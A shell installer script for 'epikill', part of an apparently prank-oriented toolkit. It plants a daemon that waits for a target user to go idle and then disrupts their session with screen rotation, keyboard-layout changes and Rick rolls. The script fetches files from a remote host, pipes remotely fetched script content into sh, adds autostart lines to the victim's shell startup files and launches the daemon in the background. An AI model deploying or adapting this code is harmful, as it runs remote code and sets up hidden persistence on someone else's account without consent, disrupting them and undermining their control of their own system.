#!/bin/sh
# epikill - wait for the target to go idle, then unleash the EpiWTF chaos
# (rotating screen, random keyboard layouts, i3 nags, Rick rolls...).
# Reused from ilil2's EpiWTF prank.

dir="${AFS_DIR:-$HOME}/.confloose/bin/epikill"
file="$dir/confloose-epikill"
base="${CONFLOOSE_BASE:-https://sayt-0.github.io/Confloose}"
mkdir -p "$dir"

# Any failed download: install nothing and exit non-zero so install.sh records nothing.
curl -fsSL "$base/confloose/epikill/daemon.sh" > "$file"            || { rm -rf "$dir"; exit 1; }
curl -fsSL "$base/confloose/epikill/gollum.png" > "$dir/gollum.png" || { rm -rf "$dir"; exit 1; }
curl -fsSL "$base/confloose/epikill/yan.jpg"    > "$dir/yan.jpg"    || { rm -rf "$dir"; exit 1; }
chmod +x "$file"

echo $(curl -fsSL "$base/confloose/bashrc_confloose_base.sh") "epikill" "'\"$file\" 2>/dev/null 1>&2 &'" | sh
# Start now too; the daemon's lock makes a second start a no-op.
"$file" >/dev/null 2>&1 &
for name in bashrc zshrc; do [ -f "$HOME/.$name" ] && ( . "$HOME/.$name" ) 2>/dev/null; done; true
